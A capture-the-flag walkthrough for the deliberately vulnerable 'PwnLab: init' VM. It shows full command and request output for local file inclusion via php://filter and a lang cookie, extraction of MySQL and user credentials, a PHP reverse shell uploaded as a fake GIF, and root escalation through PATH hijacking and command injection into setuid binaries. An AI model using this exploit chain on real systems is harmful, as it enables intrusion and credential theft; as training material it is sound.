## PwnLab: init

### info

```
Description

Wellcome to "PwnLab: init", my first Boot2Root virtual machine. Meant to be easy, I hope you enjoy it and maybe learn something. The purpose of this CTF is to get root and read de flag.

Can contact me at: claor@pwnlab.net or on Twitter: @Chronicoder

    Difficulty: Low
    Flag: /root/flag.txt

File Information

    Filename: pwnlab_init.ova
    File size: 784 MB
    MD5: CE8AB26DE76E5883E67D6DE04C0F6E43
    SHA1: 575F19216A3FA3E377EFE69D5BF715913F294A3B

Virtual Machine

    Format: Virtual Machine (Virtualbox - OVA)
    Operating System: Debian

Networking

    DHCP service: Enabled
    IP address: Automatically assign

https://www.vulnhub.com/entry/pwnlab-init,158/
```

### discovery

```
root@kali:~# netdiscover -r 192.168.93.0/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts

 6 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 360
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.93.1    00:50:56:c0:00:08      2     120  VMware, Inc.
 192.168.93.2    00:50:56:fe:26:a7      1      60  VMware, Inc.
 192.168.93.146  00:0c:29:6d:e9:65      2     120  VMware, Inc.
 192.168.93.254  00:50:56:fa:6a:82      1      60  VMware, Inc.

```

### nmap scan

```
root@kali:~# nmap -p- -sC -sV 192.168.93.146

Starting Nmap 7.25BETA1 ( https://nmap.org ) at 2016-08-30 05:40 EDT
Nmap scan report for 192.168.93.146
Host is up (0.00023s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: PwnLab Intranet Image Hosting
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          37391/tcp  status
|_  100024  1          51550/udp  status
3306/tcp  open  mysql   MySQL 5.5.47-0+deb8u1
| mysql-info:
|   Protocol: 53
|   Version: .5.47-0+deb8u1
|   Thread ID: 39
|   Capabilities flags: 63487
|   Some Capabilities: IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, InteractiveClient, SupportsCompression, LongColumnFlag, ConnectWithDatabase, FoundRows, Speaks41ProtocolOld, ODBCClient, Support41Auth, IgnoreSigpipes, SupportsLoadDataLocal, SupportsTransactions, LongPassword, DontAllowDatabaseTableColumn
|   Status: Autocommit
|_  Salt: ZxnA97GBTajnkP.2Pz8H
37391/tcp open  status  1 (RPC #100024)
MAC Address: 00:0C:29:6D:E9:65 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.70 seconds
```

### port 80

```html
root@kali:~# curl http://192.168.93.146
<html>
<head>
<title>PwnLab Intranet Image Hosting</title>
</head>
<body>
<center>
<img src="images/pwnlab.png"><br />
[ <a href="/">Home</a> ] [ <a href="?page=login">Login</a> ] [ <a href="?page=upload">Upload</a> ]
<hr/><br/>
Use this server to upload and share image files inside the intranet</center>
</body>
</html>
```

```
root@kali:~# nikto -C all -h 192.168.93.146
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.93.146
+ Target Hostname:    192.168.93.146
+ Target Port:        80
+ Start Time:         2016-08-30 05:42:39 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.10 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is "http://127.0.0.1/images/".
+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ Cookie PHPSESSID created without the httponly flag
+ /config.php: PHP Config file may contain database IDs and passwords.
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3268: /images/?pattern=/etc/*&sort=name: Directory indexing found.
+ Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.php: Admin login page/section found.
+ 26165 requests: 0 error(s) and 13 item(s) reported on remote host
+ End Time:           2016-08-30 05:43:31 (GMT-4) (52 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

looking around the web app was getting nowhere, i then stumbled across [this](https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/ )  
using this i was able to return a base64 encoded string

```html
root@kali:~# curl http://192.168.93.146/?page=php://filter/convert.base64-encode/resource=upload
<html>
<head>
<title>PwnLab Intranet Image Hosting</title>
</head>
<body>
<center>
<img src="images/pwnlab.png"><br />
[ <a href="/">Home</a> ] [ <a href="?page=login">Login</a> ] [ <a href="?page=upload">Upload</a> ]
<hr/><br/>
PD9waHANCnNlc3Npb25fc3RhcnQoKTsNCmlmICghaXNzZXQoJF9TRVNTSU9OWyd1c2VyJ10pKSB7IGRpZSgnWW91IG11c3QgYmUgbG9nIGluLicpOyB9DQo/Pg0KPGh0bWw+DQoJPGJvZHk+DQoJCTxmb3JtIGFjdGlvbj0nJyBtZXRob2Q9J3Bvc3QnIGVuY3R5cGU9J211bHRpcGFydC9mb3JtLWRhdGEnPg0KCQkJPGlucHV0IHR5cGU9J2ZpbGUnIG5hbWU9J2ZpbGUnIGlkPSdmaWxlJyAvPg0KCQkJPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0nc3VibWl0JyB2YWx1ZT0nVXBsb2FkJy8+DQoJCTwvZm9ybT4NCgk8L2JvZHk+DQo8L2h0bWw+DQo8P3BocCANCmlmKGlzc2V0KCRfUE9TVFsnc3VibWl0J10pKSB7DQoJaWYgKCRfRklMRVNbJ2ZpbGUnXVsnZXJyb3InXSA8PSAwKSB7DQoJCSRmaWxlbmFtZSAgPSAkX0ZJTEVTWydmaWxlJ11bJ25hbWUnXTsNCgkJJGZpbGV0eXBlICA9ICRfRklMRVNbJ2ZpbGUnXVsndHlwZSddOw0KCQkkdXBsb2FkZGlyID0gJ3VwbG9hZC8nOw0KCQkkZmlsZV9leHQgID0gc3RycmNocigkZmlsZW5hbWUsICcuJyk7DQoJCSRpbWFnZWluZm8gPSBnZXRpbWFnZXNpemUoJF9GSUxFU1snZmlsZSddWyd0bXBfbmFtZSddKTsNCgkJJHdoaXRlbGlzdCA9IGFycmF5KCIuanBnIiwiLmpwZWciLCIuZ2lmIiwiLnBuZyIpOyANCg0KCQlpZiAoIShpbl9hcnJheSgkZmlsZV9leHQsICR3aGl0ZWxpc3QpKSkgew0KCQkJZGllKCdOb3QgYWxsb3dlZCBleHRlbnNpb24sIHBsZWFzZSB1cGxvYWQgaW1hZ2VzIG9ubHkuJyk7DQoJCX0NCg0KCQlpZihzdHJwb3MoJGZpbGV0eXBlLCdpbWFnZScpID09PSBmYWxzZSkgew0KCQkJZGllKCdFcnJvciAwMDEnKTsNCgkJfQ0KDQoJCWlmKCRpbWFnZWluZm9bJ21pbWUnXSAhPSAnaW1hZ2UvZ2lmJyAmJiAkaW1hZ2VpbmZvWydtaW1lJ10gIT0gJ2ltYWdlL2pwZWcnICYmICRpbWFnZWluZm9bJ21pbWUnXSAhPSAnaW1hZ2UvanBnJyYmICRpbWFnZWluZm9bJ21pbWUnXSAhPSAnaW1hZ2UvcG5nJykgew0KCQkJZGllKCdFcnJvciAwMDInKTsNCgkJfQ0KDQoJCWlmKHN1YnN0cl9jb3VudCgkZmlsZXR5cGUsICcvJyk+MSl7DQoJCQlkaWUoJ0Vycm9yIDAwMycpOw0KCQl9DQoNCgkJJHVwbG9hZGZpbGUgPSAkdXBsb2FkZGlyIC4gbWQ1KGJhc2VuYW1lKCRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkuJGZpbGVfZXh0Ow0KDQoJCWlmIChtb3ZlX3VwbG9hZGVkX2ZpbGUoJF9GSUxFU1snZmlsZSddWyd0bXBfbmFtZSddLCAkdXBsb2FkZmlsZSkpIHsNCgkJCWVjaG8gIjxpbWcgc3JjPVwiIi4kdXBsb2FkZmlsZS4iXCI+PGJyIC8+IjsNCgkJfSBlbHNlIHsNCgkJCWRpZSgnRXJyb3IgNCcpOw0KCQl9DQoJfQ0KfQ0KDQo/Pg==</center>
</body>
</html>
```

decoding that provided me with the following

```php
<?php
session_start();
if (!isset($_SESSION['user'])) { die('You must be log in.'); }
?>
<html>
       	<body>
       		<form action='' method='post' enctype='multipart/form-data'>
       			<input type='file' name='file' id='file' />
       			<input type='submit' name='submit' value='Upload'/>
       		</form>
       	</body>
</html>
<?php
if(isset($_POST['submit'])) {
       	if ($_FILES['file']['error'] <= 0) {
       		$filename  = $_FILES['file']['name'];
       		$filetype  = $_FILES['file']['type'];
       		$uploaddir = 'upload/';
       		$file_ext  = strrchr($filename, '.');
       		$imageinfo = getimagesize($_FILES['file']['tmp_name']);
       		$whitelist = array(".jpg",".jpeg",".gif",".png");

       		if (!(in_array($file_ext, $whitelist))) {
       			die('Not allowed extension, please upload images only.');
       		}

       		if(strpos($filetype,'image') === false) {
       			die('Error 001');
       		}

       		if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg' && $imageinfo['mime'] != 'image/jpg'&& $imageinfo['mime'] != 'image/png') {
       			die('Error 002');
       		}

       		if(substr_count($filetype, '/')>1){
       			die('Error 003');
       		}

       		$uploadfile = $uploaddir . md5(basename($_FILES['file']['name'])).$file_ext;

       		if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
       			echo "<img src=\"".$uploadfile."\"><br />";
       		} else {
       			die('Error 4');
       		}
       	}
}

```

looking at `index.php` shows there could be a way for LFI

```php
<?php
//Multilingual. Not implemented yet.
//setcookie("lang","en.lang.php");
if (isset($_COOKIE['lang']))
{
       	include("lang/".$_COOKIE['lang']);
}
// Not implemented yet.
?>
<html>
<head>
<title>PwnLab Intranet Image Hosting</title>
</head>
<body>
<center>
<img src="images/pwnlab.png"><br />
[ <a href="/">Home</a> ] [ <a href="?page=login">Login</a> ] [ <a href="?page=upload">Upload</a> ]
<hr/><br/>
<?php
       	if (isset($_GET['page']))
       	{
       		include($_GET['page'].".php");
       	}
       	else
       	{
       		echo "Use this server to upload and share image files inside the intranet";
       	}
?>
</center>
</body>
</html>
```

### local file include

```html
root@kali:~# curl -i -s -k  -X 'GET' -H 'Upgrade-Insecure-Requests: 1'     -b 'PHPSESSID=gbcdb5poeks0p1v8rie36bvc73; lang=../../../../../../etc/passwd'     'http://192.168.93.146/?page=php://filter/convert.base64-encode/resource=index'
HTTP/1.1 200 OK
Date: Tue, 30 Aug 2016 10:02:42 GMT
Server: Apache/2.4.10 (Debian)
Vary: Accept-Encoding
Content-Length: 2659
Content-Type: text/html; charset=UTF-8

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
Debian-exim:x:104:109::/var/spool/exim4:/bin/false
messagebus:x:105:110::/var/run/dbus:/bin/false
statd:x:106:65534::/var/lib/nfs:/bin/false
john:x:1000:1000:,,,:/home/john:/bin/bash
kent:x:1001:1001:,,,:/home/kent:/bin/bash
mike:x:1002:1002:,,,:/home/mike:/bin/bash
kane:x:1003:1003:,,,:/home/kane:/bin/bash
mysql:x:107:113:MySQL Server,,,:/nonexistent:/bin/false
<html>
<head>
<title>PwnLab Intranet Image Hosting</title>
</head>
<body>
<center>
<img src="images/pwnlab.png"><br />
[ <a href="/">Home</a> ] [ <a href="?page=login">Login</a> ] [ <a href="?page=upload">Upload</a> ]
<hr/><br/>
PD9waHANCi8vTXVsdGlsaW5ndWFsLiBOb3QgaW1wbGVtZW50ZWQgeWV0Lg0KLy9zZXRjb29raWUoImxhbmciLCJlbi5sYW5nLnBocCIpOw0KaWYgKGlzc2V0KCRfQ09PS0lFWydsYW5nJ10pKQ0Kew0KCWluY2x1ZGUoImxhbmcvIi4kX0NPT0tJRVsnbGFuZyddKTsNCn0NCi8vIE5vdCBpbXBsZW1lbnRlZCB5ZXQuDQo/Pg0KPGh0bWw+DQo8aGVhZD4NCjx0aXRsZT5Qd25MYWIgSW50cmFuZXQgSW1hZ2UgSG9zdGluZzwvdGl0bGU+DQo8L2hlYWQ+DQo8Ym9keT4NCjxjZW50ZXI+DQo8aW1nIHNyYz0iaW1hZ2VzL3B3bmxhYi5wbmciPjxiciAvPg0KWyA8YSBocmVmPSIvIj5Ib21lPC9hPiBdIFsgPGEgaHJlZj0iP3BhZ2U9bG9naW4iPkxvZ2luPC9hPiBdIFsgPGEgaHJlZj0iP3BhZ2U9dXBsb2FkIj5VcGxvYWQ8L2E+IF0NCjxoci8+PGJyLz4NCjw/cGhwDQoJaWYgKGlzc2V0KCRfR0VUWydwYWdlJ10pKQ0KCXsNCgkJaW5jbHVkZSgkX0dFVFsncGFnZSddLiIucGhwIik7DQoJfQ0KCWVsc2UNCgl7DQoJCWVjaG8gIlVzZSB0aGlzIHNlcnZlciB0byB1cGxvYWQgYW5kIHNoYXJlIGltYWdlIGZpbGVzIGluc2lkZSB0aGUgaW50cmFuZXQiOw0KCX0NCj8+DQo8L2NlbnRlcj4NCjwvYm9keT4NCjwvaHRtbD4=</center>
</body>
</html>
```
### credentials

was not getting far with LFI so using the data from nikto i found credentials in `config.php`

```html
root@kali:~# curl http://192.168.93.146/?page=php://filter/convert.base64-encode/resource=config
<html>
<head>
<title>PwnLab Intranet Image Hosting</title>
</head>
<body>
<center>
<img src="images/pwnlab.png"><br />
[ <a href="/">Home</a> ] [ <a href="?page=login">Login</a> ] [ <a href="?page=upload">Upload</a> ]
<hr/><br/>
PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8+</center>
</body>
</html>
```

```
root@kali:~# echo "PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0FiYXNlID0gIlVzZXJzIjsNCj8+" | base64 -d
<?php
$server	  = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
```

### mysql access

```
root@kali:~# mysql -h 192.168.93.146 -u root -p
Enter password:
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 71
Server version: 5.5.47-0+deb8u1 (Debian)

Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

intresting stuff

```sql
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| Users              |
+--------------------+
2 rows in set (0.00 sec)

mysql> use Users
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-----------------+
| Tables_in_Users |
+-----------------+
| users           |
+-----------------+
1 row in set (0.00 sec)

mysql> select * from users;
+------+------------------+
| user | pass             |
+------+------------------+
| kent | Sld6WHVCSkpOeQ== |
| mike | U0lmZHNURW42SQ== |
| kane | aVN2NVltMkdSbw== |
+------+------------------+
3 rows in set (0.00 sec)

mysql>
```

all users have base64 encoded passwords

|user|pass|
|:--:|:--:|
|kent|JWzXuBJJNy|
|mike|SIfdsTEn6I|
|kane|iSv5Ym2GRo||

### upload

was able to long in as user `kent` then tried to upload a php webshell

initial error

`Not allowed extension, please upload images only.`

so i renamed the shell file to `.jpg`

`Error 002`

ok lets try `.gif`

after much playing around i was able to change the following request

```html
POST /?page=upload HTTP/1.1
Host: 192.168.93.146
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:48.0) Gecko/20100101 Firefox/48.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.93.146/?page=upload
Cookie: PHPSESSID=gbcdb5poeks0p1v8rie36bvc73
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------12223235713648575671888294962
Content-Length: 5841

-----------------------------12223235713648575671888294962
Content-Disposition: form-data; name="file"; filename="php-reverse-shell.php"
Content-Type: text/php
```

to

```html
POST /?page=upload HTTP/1.1
Host: 192.168.93.146
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:48.0) Gecko/20100101 Firefox/48.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.93.146/?page=upload
Cookie: PHPSESSID=gbcdb5poeks0p1v8rie36bvc73
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------12223235713648575671888294962
Content-Length: 5837

-----------------------------12223235713648575671888294962
Content-Disposition: form-data; name="file"; filename="shell.gif"
Content-Type: image/gif

GIF

<?php
```

and received a valid response

```html
HTTP/1.1 200 OK
Date: Tue, 30 Aug 2016 11:23:40 GMT
Server: Apache/2.4.10 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 541
Connection: close
Content-Type: text/html; charset=UTF-8

<html>
<head>
<title>PwnLab Intranet Image Hosting</title>
</head>
<body>
<center>
<img src="images/pwnlab.png"><br />
[ <a href="/">Home</a> ] [ <a href="?page=login">Login</a> ] [ <a href="?page=upload">Upload</a> ]
<hr/><br/>
<html>
	<body>
		<form action='' method='post' enctype='multipart/form-data'>
			<input type='file' name='file' id='file' />
			<input type='submit' name='submit' value='Upload'/>
		</form>
	</body>
</html>
<img src="upload/f3035846cc279a1aff73b7c2c25367b9.gif"><br /></center>
</body>
</html>
```
### shell

after uploading the php shell i used the following request to gain a shell on the target

```html
GET /?page=php://filter/convert.base64-encode/resource=upload HTTP/1.1
Host: 192.168.93.146
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:48.0) Gecko/20100101 Firefox/48.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=gbcdb5poeks0p1v8rie36bvc73; lang=../upload/f3035846cc279a1aff73b7c2c25367b9.gif
Connection: close
Upgrade-Insecure-Requests: 1
```

```bash
root@kali:~# nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.93.145] from (UNKNOWN) [192.168.93.146] 41040
Linux pwnlab 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt20-1+deb8u4 (2016-02-29) i686 GNU/Linux
 07:30:43 up  1:52,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@pwnlab:/$

```

### escalation

transfer over our enumeration script this one is here [LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)

looking at the `/etc/passwd` file we have some local users

```
Sample entires from /etc/passwd (searching for uid values 0, 500, 501, 502, 1000, 1001, 1002, 2000, 2001, 2002):
root:x:0:0:root:/root:/bin/bash
john:x:1000:1000:,,,:/home/john:/bin/bash
kent:x:1001:1001:,,,:/home/kent:/bin/bash
mike:x:1002:1002:,,,:/home/mike:/bin/bash
```


changing to user kane showed an executable file in this users home directory

```bash
kent@pwnlab:~$ su kane
su kane
Password: iSv5Ym2GRo

kane@pwnlab:/home/kent$ cd
cd
kane@pwnlab:~$ ls -l
ls -l
total 8
-rwsr-sr-x 1 mike mike 5148 Mar 17 13:04 msgmike
kane@pwnlab:~$ file ./msgmike
file ./msgmike
./msgmike: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d7e0b21f33b2134bd17467c3bb9be37deb88b365, not stripped
kane@pwnlab:~$
```

running this file gave the output below

```bash
kane@pwnlab:~$ ./msgmike
./msgmike
cat: /home/mike/msg.txt: No such file or directory
kane@pwnlab:~$
```
the binary uses a PATH variable that can be manipulated

```
kane@pwnlab:~$ strings ./msgmike
strings ./msgmike
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
setregid
setreuid
system
__libc_start_main
__gmon_start__
GLIBC_2.0
PTRh
QVh[
[^_]
cat /home/mike/msg.txt
;*2$"(
GCC: (Debian 4.9.2-10) 4.9.2
GCC: (Debian 4.8.4-1) 4.8.4
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rel.dyn
.rel.plt
.init
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.jcr
.dynamic
.got
.got.plt
.data
.bss
.comment
crtstuff.c
__JCR_LIST__
deregister_tm_clones
register_tm_clones
__do_global_dtors_aux
completed.6279
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
msgmike.c
__FRAME_END__
__JCR_END__
__init_array_end
_DYNAMIC
__init_array_start
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
__x86.get_pc_thunk.bx
data_start
_edata
_fini
__data_start
system@@GLIBC_2.0
__gmon_start__
__dso_handle
_IO_stdin_used
setreuid@@GLIBC_2.0
__libc_start_main@@GLIBC_2.0
__libc_csu_init
_end
_start
_fp_hw
__bss_start
main
setregid@@GLIBC_2.0
_Jv_RegisterClasses
__TMC_END__
_ITM_registerTMCloneTable
_init
```
changing this to include `/tmp` in the path

```
kane@pwnlab:~$ export PATH=/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
</tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

adding our `cat` file in the `/tmp` dir should give a shell as the user `mike`

```bash
kane@pwnlab:~$ echo "#\!/bin/sh" >/tmp/cat
echo "#\!/bin/sh" >/tmp/cat
kane@pwnlab:~$ echo "/bin/sh" >>/tmp/cat
echo "/bin/sh" >>/tmp/cat
kane@pwnlab:~$ cat /tmp/cat
cat /tmp/cat
#\!/bin/sh
/bin/sh
```

```bash
kane@pwnlab:~$ chmod +x /tmp/cat
chmod +x /tmp/cat
kane@pwnlab:~$ ./msgmike
./msgmike
$ id
id
uid=1002(mike) gid=1002(mike) groups=1002(mike),1003(kane)
```

```
$ cd /home/mike
cd /home/mike
$ ls -l
ls -l
total 8
-rwsr-sr-x 1 root root 5364 Mar 17 13:07 msg2root
$ strings ./msg2root
strings ./msg2root
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
stdin
fgets
asprintf
system
__libc_start_main
__gmon_start__
GLIBC_2.0
PTRh
[^_]
Message for root:
/bin/echo %s >> /root/messages.txt
;*2$"(
GCC: (Debian 4.9.2-10) 4.9.2
GCC: (Debian 4.8.4-1) 4.8.4
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rel.dyn
.rel.plt
.init
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.jcr
.dynamic
.got
.got.plt
.data
.bss
.comment
crtstuff.c
__JCR_LIST__
deregister_tm_clones
register_tm_clones
__do_global_dtors_aux
completed.6279
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
msg2root.c
__FRAME_END__
__JCR_END__
__init_array_end
_DYNAMIC
__init_array_start
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
__x86.get_pc_thunk.bx
data_start
printf@@GLIBC_2.0
fgets@@GLIBC_2.0
_edata
_fini
__data_start
system@@GLIBC_2.0
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_start_main@@GLIBC_2.0
__libc_csu_init
stdin@@GLIBC_2.0
_end
_start
_fp_hw
asprintf@@GLIBC_2.0
__bss_start
main
_Jv_RegisterClasses
__TMC_END__
_ITM_registerTMCloneTable
_init
$
```

### escalation

looking at the binary, it may be susceptible to command injection because of `Message for root: /bin/echo %s >> /root/messages.txt`

```bash
$ ./msg2root
./msg2root
Message for root: bbbbbb;/bin/sh
bbbbbb;/bin/sh
bbbbbb
# id
id
uid=1002(mike) gid=1002(mike) euid=0(root) egid=0(root) groups=0(root),1003(kane)
# whoami
whoami
root
```

### flag

```bash
# cd /root
cd /root
# ls -l
ls -l
total 4
---------- 1 root root 1840 Mar 17 15:17 flag.txt
lrwxrwxrwx 1 root root    9 Mar 17 13:10 messages.txt -> /dev/null
# /bin/cat flag.txt
/bin/cat flag.txt
.-=~=-.                                                                 .-=~=-.
(__  _)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(__  _)
(_ ___)  _____                             _                            (_ ___)
(__  _) /  __ \                           | |                           (__  _)
( _ __) | /  \/ ___  _ __   __ _ _ __ __ _| |_ ___                      ( _ __)
(__  _) | |    / _ \| '_ \ / _` | '__/ _` | __/ __|                     (__  _)
(_ ___) | \__/\ (_) | | | | (_| | | | (_| | |_\__ \                     (_ ___)
(__  _)  \____/\___/|_| |_|\__, |_|  \__,_|\__|___/                     (__  _)
( _ __)                     __/ |                                       ( _ __)
(__  _)                    |___/                                        (__  _)
(__  _)                                                                 (__  _)
(_ ___) If  you are  reading this,  means  that you have  break 'init'  (_ ___)
( _ __) Pwnlab.  I hope  you enjoyed  and thanks  for  your time doing  ( _ __)
(__  _) this challenge.                                                 (__  _)
(_ ___)                                                                 (_ ___)
( _ __) Please send me  your  feedback or your  writeup,  I will  love  ( _ __)
(__  _) reading it                                                      (__  _)
(__  _)                                                                 (__  _)
(__  _)                                             For sniferl4bs.com  (__  _)
( _ __)                                claor@PwnLab.net - @Chronicoder  ( _ __)
(__  _)                                                                 (__  _)
(_ ___)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(_ ___)
`-._.-'                                                                 `-._.-'
#
```
